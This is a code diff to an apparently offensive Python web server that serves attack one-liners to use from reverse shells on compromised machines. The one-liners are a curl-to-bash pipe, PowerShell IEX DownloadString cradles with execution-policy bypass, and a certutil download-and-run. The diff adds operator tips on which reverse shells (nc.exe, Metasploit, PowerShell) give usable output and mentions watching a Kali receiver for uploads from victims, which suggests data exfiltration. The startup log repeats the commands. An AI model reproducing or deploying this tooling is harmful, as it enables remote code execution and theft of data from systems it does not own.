@@ -116,14 +116,29 @@ curl -sSL http://{request.host}/get-script | bash
 powershell -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadString('http://{request.host}/get-script.ps1') | Invoke-Expression"
         </code>
         
-        <p><strong>🪟 Windows Netcat/Reverse Shell (BEST):</strong></p>
+        <p><strong>🪟 Windows Netcat/Reverse Shell (RECOMMENDED):</strong></p>
         <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
 powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://{request.host}/wrapper-inline.ps1')"
         </code>
         
-        <p><strong>🪟 Windows Netcat/Reverse Shell (Alternative):</strong></p>
+        <div style="background: #2a1a00; border-left: 4px solid #ff9900; padding: 10px; margin: 15px 0;">
+            <strong style="color: #ff9900;">⚠️ IMPORTANT - Windows Shell Compatibility:</strong><br>
+            <ul style="color: #ffcc66; margin: 10px 0;">
+                <li><strong style="color: #00ff00;">✅ BEST:</strong> Netcat CMD shell (nc.exe → cmd.exe → nc listener)</li>
+                <li><strong style="color: #ffff00;">⚠️ CAUTION:</strong> PowerShell reverse shells may break output or shell</li>
+                <li><strong style="color: #00ff00;">✅ WORKS:</strong> Metasploit shells have proper output handling</li>
+                <li><strong style="color: #00ff00;">✅ WORKS:</strong> Interactive PowerShell/CMD windows</li>
+            </ul>
+            <p style="color: #ffcc66; margin: 5px 0;">
+                <em>If you see no output but uploads work: You're in a PowerShell reverse shell.<br>
+                Script still runs successfully - monitor your Kali receiver for upload confirmation!</em>
+            </p>
+        </div>
+        
+        <p><strong>🪟 Windows - Alternative (2-step for problematic shells):</strong></p>
         <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
-certutil -urlcache -f http://{request.host}/get-script.ps1 %TEMP%\w.ps1 & powershell -ExecutionPolicy Bypass -File %TEMP%\w.ps1
+certutil -urlcache -f http://{request.host}/get-script.ps1 %TEMP%\w.ps1<br>
+powershell -ExecutionPolicy Bypass -File %TEMP%\w.ps1
         </code>
         
         <hr>
@@ -329,7 +344,11 @@ if __name__ == '__main__':
     log(f"[+] Starting server...\n")
     log(f"[+] Linux:       curl -sSL http://YOUR_IP:8000/get-script | bash")
     log(f"[+] Windows:     powershell -ExecutionPolicy Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP:8000/wrapper-inline.ps1')\"")
-    log(f"[+] Windows Alt: powershell -ExecutionPolicy Bypass -Command \"(New-Object System.Net.WebClient).DownloadString('http://YOUR_IP:8000/get-script.ps1') | iex\"\n")
+    log("")
+    log(f"⚠️  Windows Shell Compatibility:")
+    log(f"   ✅ BEST: nc.exe CMD shells (full output visibility)")
+    log(f"   ⚠️  CAUTION: PowerShell reverse shells (may break output/shell)")
+    log(f"   ✅ WORKS: Metasploit, Interactive PowerShell/CMD\n")
     log(f"[*] Waiting for connections...\n")
     
     # Run on all interfaces, port 8000
